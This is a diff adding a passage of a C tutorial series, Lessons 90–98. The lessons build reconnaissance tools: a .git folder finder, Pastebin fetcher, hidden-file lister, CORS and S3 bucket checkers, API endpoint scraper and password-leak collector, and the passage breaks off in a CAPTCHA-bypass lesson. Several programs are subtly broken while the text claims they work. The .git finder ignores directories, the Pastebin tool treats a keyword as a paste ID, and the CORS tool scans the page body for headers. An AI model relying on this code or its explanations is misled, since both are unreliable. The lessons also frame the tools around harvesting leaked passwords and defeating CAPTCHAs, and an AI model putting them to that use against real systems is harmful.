+    DIR *dir;
+    struct dirent *entry;
+
+    // Open the directory
+    dir = opendir(dir_path);
+    if (!dir) {
+        fprintf(stderr, "Error opening directory: %s\n", dir_path);
+        exit(EXIT_FAILURE);
+    }
+
+    // Read each entry in the directory
+    while ((entry = readdir(dir)) != NULL) {
+        // Ignore "." and ".." entries
+        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
+            char file_path[MAX_PATH_LENGTH];
+            snprintf(file_path, sizeof(file_path), "%s/%s", dir_path, entry->d_name);
+
+            // Check if the entry is a directory
+            if (entry->d_type == DT_DIR) {
+                // Recursively collect Git folders from the subdirectory
+                collect_git_folders(file_path);
+            } else {
+                // Check if the entry is a Git repository folder
+                if (strcmp(entry->d_name, GIT_FOLDER_NAME) == 0) {
+                    // Print the path of the Git repository folder
+                    printf("Git folder: %s\n", file_path);
+                }
+            }
+        }
+    }
+
+    // Close the directory
+    closedir(dir);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <directory_path>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Starting Git folder collection...\n");
+
+    // Collect Git repository folders from the specified directory
+    collect_git_folders(argv[1]);
+
+    printf("Git folder collection completed.\n");
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `collect_git_folders` function recursively collects Git repository folders from the specified directory and its subdirectories.
+- The name of the Git repository folder is defined as a string (`GIT_FOLDER_NAME`) containing ".git".
+- For each directory encountered, it checks if the directory name matches the Git repository folder name. If so, it prints the path of the Git repository folder.
+- The `main` function expects a directory path as a command-line argument and calls the `collect_git_folders` function to collect Git repository folders from that directory.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for filtering Git repository folders based on the presence of specific Git files or configurations.
+- Integration with Git parsing libraries or tools to analyze collected Git repository folders and extract meaningful information or perform repository checks.
+- Implementation of file hashing or integrity checks to ensure the collected Git repository folders are not tampered with.
+
+#### Conclusion:
+
+Building a Git folder collection tool in C provides a framework for gathering Git repository folders from specified directories. By recursively searching for Git repository folders, developers and administrators can manage and analyze project repositories efficiently for various purposes.
+
+This concludes our ninetieth lesson on building a Git folder collection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 91: Building a Pastebin Entry Collection Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to collect Pastebin entries. Pastebin is a popular platform where users can share text snippets and code snippets. Our tool will search for Pastebin entries containing specific keywords or patterns and collect them for further analysis.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <curl/curl.h>
+
+#define PASTEBIN_URL "https://pastebin.com/raw/"
+
+// Struct to hold response data from CURL
+struct ResponseData {
+    char *buffer;
+    size_t size;
+};
+
+// CURL write callback function to write received data to buffer
+static size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
+    struct ResponseData *data = (struct ResponseData *)userdata;
+    size_t real_size = size * nmemb;
+
+    // Reallocate buffer to accommodate new data
+    data->buffer = realloc(data->buffer, data->size + real_size + 1);
+    if (data->buffer == NULL) {
+        fprintf(stderr, "Error: Failed to allocate memory.\n");
+        return 0;
+    }
+
+    // Copy received data to buffer
+    memcpy(&(data->buffer[data->size]), ptr, real_size);
+    data->size += real_size;
+    data->buffer[data->size] = 0;
+
+    return real_size;
+}
+
+// Function to collect Pastebin entries containing specified keyword
+void collect_pastebin_entries(const char *keyword) {
+    CURL *curl = curl_easy_init();
+    if (!curl) {
+        fprintf(stderr, "Error: Failed to initialize CURL.\n");
+        return;
+    }
+
+    // Set URL to fetch Pastebin entry
+    char url[strlen(PASTEBIN_URL) + strlen(keyword) + 1];
+    sprintf(url, "%s%s", PASTEBIN_URL, keyword);
+    curl_easy_setopt(curl, CURLOPT_URL, url);
+
+    // Set write callback function to store response data
+    struct ResponseData data = { .buffer = NULL, .size = 0 };
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
+
+    // Perform CURL request
+    CURLcode res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        fprintf(stderr, "Error: Failed to fetch Pastebin entry. %s\n", curl_easy_strerror(res));
+    } else {
+        // Print collected Pastebin entry
+        printf("Pastebin entry containing keyword \"%s\":\n%s\n", keyword, data.buffer);
+    }
+
+    // Cleanup CURL resources
+    curl_easy_cleanup(curl);
+    free(data.buffer);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <keyword>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Starting Pastebin entry collection...\n");
+
+    // Collect Pastebin entry containing specified keyword
+    collect_pastebin_entries(argv[1]);
+
+    printf("Pastebin entry collection completed.\n");
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- We use the libcurl library to perform HTTP requests and fetch Pastebin entries.
+- The `collect_pastebin_entries` function fetches a Pastebin entry containing the specified keyword using the Pastebin raw URL.
+- The response data is stored in a buffer using the `write_callback` function, which is set as the write callback for libcurl.
+- The `main` function expects a keyword as a command-line argument and calls the `collect_pastebin_entries` function to fetch the Pastebin entry containing that keyword.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for fetching multiple Pastebin entries containing different keywords.
+- Integration with text analysis or natural language processing libraries to extract meaningful information from collected Pastebin entries.
+- Implementation of error handling and retries for robust HTTP request handling.
+
+#### Conclusion:
+
+Building a Pastebin entry collection tool in C provides a framework for gathering text snippets and code snippets from Pastebin. By fetching entries containing specific keywords, researchers and analysts can monitor and analyze content shared on Pastebin for various purposes.
+
+This concludes our ninety-first lesson on building a Pastebin entry collection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 92: Building a Hidden File Collection Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to collect hidden files from a specified directory. Hidden files are files that start with a dot (.) in their filenames on Unix-like systems. Our tool will search for hidden files within the specified directory and collect them for further analysis.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dirent.h>
+#include <sys/stat.h>
+
+#define MAX_PATH_LENGTH 256
+
+// Function to recursively collect hidden files from a directory
+void collect_hidden_files(const char *dir_path) {
+    DIR *dir;
+    struct dirent *entry;
+
+    // Open the directory
+    dir = opendir(dir_path);
+    if (!dir) {
+        fprintf(stderr, "Error opening directory: %s\n", dir_path);
+        exit(EXIT_FAILURE);
+    }
+
+    // Read each entry in the directory
+    while ((entry = readdir(dir)) != NULL) {
+        // Ignore "." and ".." entries
+        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
+            char file_path[MAX_PATH_LENGTH];
+            snprintf(file_path, sizeof(file_path), "%s/%s", dir_path, entry->d_name);
+
+            // Check if the entry is a directory
+            if (entry->d_type == DT_DIR) {
+                // Recursively collect hidden files from the subdirectory
+                collect_hidden_files(file_path);
+            } else {
+                // Check if the entry is a hidden file
+                if (entry->d_name[0] == '.') {
+                    // Print the path of the hidden file
+                    printf("Hidden file: %s\n", file_path);
+                }
+            }
+        }
+    }
+
+    // Close the directory
+    closedir(dir);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <directory_path>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Starting hidden file collection...\n");
+
+    // Collect hidden files from the specified directory
+    collect_hidden_files(argv[1]);
+
+    printf("Hidden file collection completed.\n");
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `collect_hidden_files` function recursively collects hidden files from the specified directory and its subdirectories.
+- For each directory entry, it checks if the entry name starts with a dot (.) character, indicating a hidden file.
+- If the entry is a hidden file, it prints the path of the hidden file.
+- The `main` function expects a directory path as a command-line argument and calls the `collect_hidden_files` function to collect hidden files from that directory.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for collecting hidden files on Windows systems, where hidden files are marked differently.
+- Integration with file hashing or integrity checks to ensure the collected hidden files are not tampered with.
+- Implementation of file filtering based on file types, extensions, or other metadata.
+
+#### Conclusion:
+
+Building a hidden file collection tool in C provides a framework for gathering hidden files from specified directories. By recursively searching for hidden files, developers and administrators can manage and analyze file systems efficiently for various purposes.
+
+This concludes our ninety-second lesson on building a hidden file collection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 93: Building a Cross-Domain Resource Sharing (CORS) Analysis Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to analyze Cross-Origin Resource Sharing (CORS) policies of web applications. CORS is a security feature implemented by web browsers to restrict cross-origin HTTP requests initiated from scripts running on a web page. Our tool will analyze HTTP responses and identify CORS-related headers to determine the CORS policy of a given URL.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <curl/curl.h>
+
+#define MAX_URL_LENGTH 256
+
+// Struct to hold response data from CURL
+struct ResponseData {
+    char *buffer;
+    size_t size;
+};
+
+// CURL write callback function to write received data to buffer
+static size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
+    struct ResponseData *data = (struct ResponseData *)userdata;
+    size_t real_size = size * nmemb;
+
+    // Reallocate buffer to accommodate new data
+    data->buffer = realloc(data->buffer, data->size + real_size + 1);
+    if (data->buffer == NULL) {
+        fprintf(stderr, "Error: Failed to allocate memory.\n");
+        return 0;
+    }
+
+    // Copy received data to buffer
+    memcpy(&(data->buffer[data->size]), ptr, real_size);
+    data->size += real_size;
+    data->buffer[data->size] = 0;
+
+    return real_size;
+}
+
+// Function to analyze CORS headers of a given URL
+void analyze_cors_policy(const char *url) {
+    CURL *curl = curl_easy_init();
+    if (!curl) {
+        fprintf(stderr, "Error: Failed to initialize CURL.\n");
+        return;
+    }
+
+    // Set URL for HTTP GET request
+    curl_easy_setopt(curl, CURLOPT_URL, url);
+
+    // Set write callback function to store response data
+    struct ResponseData data = { .buffer = NULL, .size = 0 };
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
+
+    // Perform CURL request
+    CURLcode res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        fprintf(stderr, "Error: Failed to fetch URL. %s\n", curl_easy_strerror(res));
+    } else {
+        // Print response headers
+        char *token = strtok(data.buffer, "\n");
+        while (token != NULL) {
+            // Check for CORS-related headers
+            if (strncasecmp(token, "Access-Control-Allow-Origin:", 28) == 0 ||
+                strncasecmp(token, "Access-Control-Allow-Methods:", 29) == 0 ||
+                strncasecmp(token, "Access-Control-Allow-Headers:", 29) == 0 ||
+                strncasecmp(token, "Access-Control-Max-Age:", 24) == 0) {
+                printf("%s\n", token);
+            }
+            token = strtok(NULL, "\n");
+        }
+    }
+
+    // Cleanup CURL resources
+    curl_easy_cleanup(curl);
+    free(data.buffer);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <url>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Analyzing CORS policy for URL: %s\n", argv[1]);
+
+    // Analyze CORS policy for the specified URL
+    analyze_cors_policy(argv[1]);
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- We use the libcurl library to perform HTTP GET requests and fetch HTTP responses.
+- The `analyze_cors_policy` function sends an HTTP GET request to the specified URL and analyzes the CORS-related headers in the response.
+- The response headers are parsed, and CORS-related headers such as `Access-Control-Allow-Origin`, `Access-Control-Allow-Methods`, `Access-Control-Allow-Headers`, and `Access-Control-Max-Age` are printed.
+- The `main` function expects a URL as a command-line argument and calls the `analyze_cors_policy` function to analyze the CORS policy for that URL.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for analyzing multiple URLs in batch mode.
+- Integration with domain-specific knowledge to provide recommendations or alerts based on CORS policy analysis.
+- Implementation of error handling and retries for robust HTTP request handling.
+
+#### Conclusion:
+
+Building a CORS policy analysis tool in C provides a framework for analyzing the Cross-Origin Resource Sharing policies of web applications. By analyzing HTTP responses for CORS-related headers, developers and security professionals can assess the security posture of web applications and identify potential CORS misconfigurations.
+
+This concludes our ninety-third lesson on building a CORS policy analysis tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 94: Building a Cloud Storage and Buckets Analysis Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to analyze cloud storage services and buckets. Cloud storage services, such as Amazon S3, Google Cloud Storage, or Azure Blob Storage, provide scalable and durable storage solutions for data storage and retrieval. Our tool will analyze cloud storage services and enumerate buckets to gather information about available resources and configurations.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <curl/curl.h>
+#include <jansson.h>
+
+#define MAX_URL_LENGTH 256
+
+// Struct to hold response data from CURL
+struct ResponseData {
+    char *buffer;
+    size_t size;
+};
+
+// CURL write callback function to write received data to buffer
+static size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
+    struct ResponseData *data = (struct ResponseData *)userdata;
+    size_t real_size = size * nmemb;
+
+    // Reallocate buffer to accommodate new data
+    data->buffer = realloc(data->buffer, data->size + real_size + 1);
+    if (data->buffer == NULL) {
+        fprintf(stderr, "Error: Failed to allocate memory.\n");
+        return 0;
+    }
+
+    // Copy received data to buffer
+    memcpy(&(data->buffer[data->size]), ptr, real_size);
+    data->size += real_size;
+    data->buffer[data->size] = 0;
+
+    return real_size;
+}
+
+// Function to analyze cloud storage buckets for a given URL
+void analyze_cloud_storage(const char *url) {
+    CURL *curl = curl_easy_init();
+    if (!curl) {
+        fprintf(stderr, "Error: Failed to initialize CURL.\n");
+        return;
+    }
+
+    // Set URL for HTTP GET request
+    curl_easy_setopt(curl, CURLOPT_URL, url);
+
+    // Set write callback function to store response data
+    struct ResponseData data = { .buffer = NULL, .size = 0 };
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
+
+    // Perform CURL request
+    CURLcode res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        fprintf(stderr, "Error: Failed to fetch URL. %s\n", curl_easy_strerror(res));
+    } else {
+        // Parse JSON response
+        json_error_t error;
+        json_t *root = json_loads(data.buffer, 0, &error);
+        if (!root) {
+            fprintf(stderr, "Error: Failed to parse JSON. %s\n", error.text);
+        } else {
+            // Extract bucket information from JSON response
+            json_t *buckets = json_object_get(root, "buckets");
+            if (json_is_array(buckets)) {
+                size_t index;
+                json_t *value;
+                json_array_foreach(buckets, index, value) {
+                    const char *bucket_name = json_string_value(value);
+                    if (bucket_name) {
+                        printf("Bucket: %s\n", bucket_name);
+                    }
+                }
+            }
+            json_decref(root);
+        }
+    }
+
+    // Cleanup CURL resources
+    curl_easy_cleanup(curl);
+    free(data.buffer);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <cloud_storage_url>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Analyzing cloud storage buckets for URL: %s\n", argv[1]);
+
+    // Analyze cloud storage buckets for the specified URL
+    analyze_cloud_storage(argv[1]);
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- We use the libcurl library to perform HTTP GET requests and fetch HTTP responses.
+- The `analyze_cloud_storage` function sends an HTTP GET request to the specified URL, typically an API endpoint of a cloud storage service.
+- The response is expected to be in JSON format, containing information about available buckets.
+- We use the `jansson` library to parse the JSON response and extract bucket information.
+- The extracted bucket names are printed to the console for analysis.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for different cloud storage services by dynamically determining API endpoints based on provided URLs.
+- Integration with cloud storage SDKs or APIs to gather more detailed information about buckets, such as permissions, object counts, or storage usage.
+- Implementation of error handling and retries for robust HTTP request handling.
+
+#### Conclusion:
+
+Building a cloud storage and buckets analysis tool in C provides a framework for gathering information about available buckets in cloud storage services. By analyzing cloud storage resources, administrators and developers can manage and secure cloud storage environments effectively.
+
+This concludes our ninety-fourth lesson on building a cloud storage and buckets analysis tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 95: Building an Amazon S3 Bucket Analysis Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to analyze Amazon S3 buckets. Amazon S3 is a popular cloud storage service provided by Amazon Web Services (AWS), allowing users to store and retrieve data objects. Our tool will analyze Amazon S3 buckets to gather information about available resources and configurations.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <curl/curl.h>
+#include <jansson.h>
+
+#define MAX_URL_LENGTH 256
+
+// Struct to hold response data from CURL
+struct ResponseData {
+    char *buffer;
+    size_t size;
+};
+
+// CURL write callback function to write received data to buffer
+static size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
+    struct ResponseData *data = (struct ResponseData *)userdata;
+    size_t real_size = size * nmemb;
+
+    // Reallocate buffer to accommodate new data
+    data->buffer = realloc(data->buffer, data->size + real_size + 1);
+    if (data->buffer == NULL) {
+        fprintf(stderr, "Error: Failed to allocate memory.\n");
+        return 0;
+    }
+
+    // Copy received data to buffer
+    memcpy(&(data->buffer[data->size]), ptr, real_size);
+    data->size += real_size;
+    data->buffer[data->size] = 0;
+
+    return real_size;
+}
+
+// Function to analyze Amazon S3 buckets for a given URL
+void analyze_s3_buckets(const char *url) {
+    CURL *curl = curl_easy_init();
+    if (!curl) {
+        fprintf(stderr, "Error: Failed to initialize CURL.\n");
+        return;
+    }
+
+    // Set URL for HTTP GET request
+    curl_easy_setopt(curl, CURLOPT_URL, url);
+
+    // Set write callback function to store response data
+    struct ResponseData data = { .buffer = NULL, .size = 0 };
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
+
+    // Perform CURL request
+    CURLcode res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        fprintf(stderr, "Error: Failed to fetch URL. %s\n", curl_easy_strerror(res));
+    } else {
+        // Parse JSON response
+        json_error_t error;
+        json_t *root = json_loads(data.buffer, 0, &error);
+        if (!root) {
+            fprintf(stderr, "Error: Failed to parse JSON. %s\n", error.text);
+        } else {
+            // Extract bucket information from JSON response
+            json_t *buckets = json_object_get(root, "Buckets");
+            if (json_is_array(buckets)) {
+                size_t index;
+                json_t *value;
+                json_array_foreach(buckets, index, value) {
+                    json_t *bucket_name = json_object_get(value, "Name");
+                    json_t *creation_date = json_object_get(value, "CreationDate");
+                    if (json_is_string(bucket_name) && json_is_string(creation_date)) {
+                        printf("Bucket: %s (Created: %s)\n", json_string_value(bucket_name), json_string_value(creation_date));
+                    }
+                }
+            }
+            json_decref(root);
+        }
+    }
+
+    // Cleanup CURL resources
+    curl_easy_cleanup(curl);
+    free(data.buffer);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <s3_url>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Analyzing Amazon S3 buckets for URL: %s\n", argv[1]);
+
+    // Analyze Amazon S3 buckets for the specified URL
+    analyze_s3_buckets(argv[1]);
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- We use the libcurl library to perform HTTP GET requests and fetch HTTP responses.
+- The `analyze_s3_buckets` function sends an HTTP GET request to the specified URL, typically an AWS S3 API endpoint.
+- The response is expected to be in JSON format, containing information about available S3 buckets.
+- We use the `jansson` library to parse the JSON response and extract bucket names and creation dates.
+- The extracted bucket information is printed to the console for analysis.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for authentication mechanisms such as AWS IAM credentials for accessing protected S3 buckets.
+- Integration with AWS SDKs or APIs to gather more detailed information about buckets, such as permissions, object counts, or storage usage.
+- Implementation of error handling and retries for robust HTTP request handling.
+
+#### Conclusion:
+
+Building an Amazon S3 bucket analysis tool in C provides a framework for gathering information about available S3 buckets in AWS environments. By analyzing S3 buckets, administrators and developers can manage and secure cloud storage resources effectively.
+
+This concludes our ninety-fifth lesson on building an Amazon S3 bucket analysis tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 96: Building an API Endpoint Collection Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to collect API endpoints from a given URL. API endpoints are URLs that are exposed by web services to interact with their functionality programmatically. Our tool will analyze the provided URL and identify API endpoints by inspecting HTML content or making requests to explore available resources.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <curl/curl.h>
+#include <regex.h>
+
+#define MAX_URL_LENGTH 256
+#define MAX_REGEX_LENGTH 512
+
+// Struct to hold response data from CURL
+struct ResponseData {
+    char *buffer;
+    size_t size;
+};
+
+// CURL write callback function to write received data to buffer
+static size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
+    struct ResponseData *data = (struct ResponseData *)userdata;
+    size_t real_size = size * nmemb;
+
+    // Reallocate buffer to accommodate new data
+    data->buffer = realloc(data->buffer, data->size + real_size + 1);
+    if (data->buffer == NULL) {
+        fprintf(stderr, "Error: Failed to allocate memory.\n");
+        return 0;
+    }
+
+    // Copy received data to buffer
+    memcpy(&(data->buffer[data->size]), ptr, real_size);
+    data->size += real_size;
+    data->buffer[data->size] = 0;
+
+    return real_size;
+}
+
+// Function to collect API endpoints from a given URL
+void collect_api_endpoints(const char *url, const char *regex_pattern) {
+    CURL *curl = curl_easy_init();
+    if (!curl) {
+        fprintf(stderr, "Error: Failed to initialize CURL.\n");
+        return;
+    }
+
+    // Set URL for HTTP GET request
+    curl_easy_setopt(curl, CURLOPT_URL, url);
+
+    // Set write callback function to store response data
+    struct ResponseData data = { .buffer = NULL, .size = 0 };
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
+
+    // Perform CURL request
+    CURLcode res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        fprintf(stderr, "Error: Failed to fetch URL. %s\n", curl_easy_strerror(res));
+    } else {
+        // Compile regex pattern
+        regex_t regex;
+        int reti = regcomp(&regex, regex_pattern, REG_EXTENDED);
+        if (reti != 0) {
+            fprintf(stderr, "Error: Failed to compile regex pattern.\n");
+            return;
+        }
+
+        // Execute regex match on response data
+        size_t nmatch = 10;
+        regmatch_t pmatch[nmatch];
+        reti = regexec(&regex, data.buffer, nmatch, pmatch, 0);
+        if (reti == 0) {
+            printf("API endpoints found:\n");
+            for (size_t i = 0; i < nmatch; i++) {
+                if (pmatch[i].rm_so != -1) {
+                    char *match = strndup(data.buffer + pmatch[i].rm_so, pmatch[i].rm_eo - pmatch[i].rm_so);
+                    printf("%s\n", match);
+                    free(match);
+                }
+            }
+        } else if (reti == REG_NOMATCH) {
+            printf("No API endpoints found.\n");
+        } else {
+            fprintf(stderr, "Error: Failed to execute regex match.\n");
+        }
+
+        // Free regex resources
+        regfree(&regex);
+    }
+
+    // Cleanup CURL resources
+    curl_easy_cleanup(curl);
+    free(data.buffer);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 3) {
+        fprintf(stderr, "Usage: %s <url> <regex_pattern>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Collecting API endpoints from URL: %s\n", argv[1]);
+
+    // Collect API endpoints from the specified URL using the provided regex pattern
+    collect_api_endpoints(argv[1], argv[2]);
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- We use the libcurl library to perform HTTP GET requests and fetch HTTP responses.
+- The `collect_api_endpoints` function sends an HTTP GET request to the specified URL and collects the response data.
+- It compiles the provided regex pattern using the POSIX regex library (`regex.h`).
+- The response data is then matched against the regex pattern to identify API endpoints.
+- Matching results are printed to the console.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for multiple regex patterns to capture different types of API endpoints.
+- Integration with HTML parsing libraries to extract links and endpoints from HTML content more accurately.
+- Implementation of concurrency or parallelism for faster processing of large responses or multiple URLs.
+
+#### Conclusion:
+
+Building an API endpoint collection tool in C provides a framework for gathering API endpoints from web services. By analyzing URL content and applying regex patterns, developers and analysts can identify and catalog available API endpoints for various purposes.
+
+This concludes our ninety-sixth lesson on building an API endpoint collection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 97: Building a Plain Text Password Leak Collection Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to collect plain text password leaks from various sources. Plain text password leaks occur when passwords are stored or transmitted without encryption, making them vulnerable to interception or unauthorized access. Our tool will search for plain text password leaks by analyzing web content or accessing known leak repositories.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <curl/curl.h>
+#include <regex.h>
+
+#define MAX_URL_LENGTH 256
+#define MAX_REGEX_LENGTH 512
+
+// Struct to hold response data from CURL
+struct ResponseData {
+    char *buffer;
+    size_t size;
+};
+
+// CURL write callback function to write received data to buffer
+static size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
+    struct ResponseData *data = (struct ResponseData *)userdata;
+    size_t real_size = size * nmemb;
+
+    // Reallocate buffer to accommodate new data
+    data->buffer = realloc(data->buffer, data->size + real_size + 1);
+    if (data->buffer == NULL) {
+        fprintf(stderr, "Error: Failed to allocate memory.\n");
+        return 0;
+    }
+
+    // Copy received data to buffer
+    memcpy(&(data->buffer[data->size]), ptr, real_size);
+    data->size += real_size;
+    data->buffer[data->size] = 0;
+
+    return real_size;
+}
+
+// Function to collect plain text password leaks from a given URL using regex pattern
+void collect_password_leaks(const char *url, const char *regex_pattern) {
+    CURL *curl = curl_easy_init();
+    if (!curl) {
+        fprintf(stderr, "Error: Failed to initialize CURL.\n");
+        return;
+    }
+
+    // Set URL for HTTP GET request
+    curl_easy_setopt(curl, CURLOPT_URL, url);
+
+    // Set write callback function to store response data
+    struct ResponseData data = { .buffer = NULL, .size = 0 };
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
+
+    // Perform CURL request
+    CURLcode res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        fprintf(stderr, "Error: Failed to fetch URL. %s\n", curl_easy_strerror(res));
+    } else {
+        // Compile regex pattern
+        regex_t regex;
+        int reti = regcomp(&regex, regex_pattern, REG_EXTENDED);
+        if (reti != 0) {
+            fprintf(stderr, "Error: Failed to compile regex pattern.\n");
+            return;
+        }
+
+        // Execute regex match on response data
+        size_t nmatch = 10;
+        regmatch_t pmatch[nmatch];
+        reti = regexec(&regex, data.buffer, nmatch, pmatch, 0);
+        if (reti == 0) {
+            printf("Password leaks found:\n");
+            for (size_t i = 0; i < nmatch; i++) {
+                if (pmatch[i].rm_so != -1) {
+                    char *match = strndup(data.buffer + pmatch[i].rm_so, pmatch[i].rm_eo - pmatch[i].rm_so);
+                    printf("%s\n", match);
+                    free(match);
+                }
+            }
+        } else if (reti == REG_NOMATCH) {
+            printf("No password leaks found.\n");
+        } else {
+            fprintf(stderr, "Error: Failed to execute regex match.\n");
+        }
+
+        // Free regex resources
+        regfree(&regex);
+    }
+
+    // Cleanup CURL resources
+    curl_easy_cleanup(curl);
+    free(data.buffer);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 3) {
+        fprintf(stderr, "Usage: %s <url> <regex_pattern>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Collecting plain text password leaks from URL: %s\n", argv[1]);
+
+    // Collect plain text password leaks from the specified URL using the provided regex pattern
+    collect_password_leaks(argv[1], argv[2]);
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- We use the libcurl library to perform HTTP GET requests and fetch HTTP responses.
+- The `collect_password_leaks` function sends an HTTP GET request to the specified URL and collects the response data.
+- It compiles the provided regex pattern using the POSIX regex library (`regex.h`).
+- The response data is then matched against the regex pattern to identify plain text password leaks.
+- Matching results are printed to the console.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Integration with known password leak repositories or databases for comprehensive leak analysis.
+- Implementation of stronger pattern matching techniques or machine learning algorithms to identify password leaks more accurately.
+- Support for searching multiple URLs or web sources in batch mode for extensive leak detection.
+
+#### Conclusion:
+
+Building a plain text password leak collection tool in C provides a framework for identifying and addressing password security vulnerabilities. By analyzing web content and applying regex patterns, administrators and security professionals can detect and mitigate the risk of password leaks.
+
+This concludes our ninety-seventh lesson on building a plain text password leak collection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 98: Building a CAPTCHA Bypass Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to bypass CAPTCHA challenges. CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart) challenges are used to distinguish between humans and automated bots. Our tool will attempt to bypass CAPTCHA challenges by analyzing and automating interactions with CAPTCHA-protected forms or services.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <curl/curl.h>
+#include <regex.h>
+
+#define MAX_URL_LENGTH 256
+#define MAX_REGEX_LENGTH 512
+
+// Struct to hold response data from CURL
+struct ResponseData {
+    char *buffer;
+    size_t size;
+};
+
+// CURL write callback function to write received data to buffer
+static size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
+    struct ResponseData *data = (struct ResponseData *)userdata;
+    size_t real_size = size * nmemb;
+
+    // Reallocate buffer to accommodate new data
+    data->buffer = realloc(data->buffer, data->size + real_size + 1);
+    if (data->buffer == NULL) {
+        fprintf(stderr, "Error: Failed to allocate memory.\n");
+        return 0;
+    }
+
+    // Copy received data to buffer
+    memcpy(&(data->buffer[data->size]), ptr, real_size);
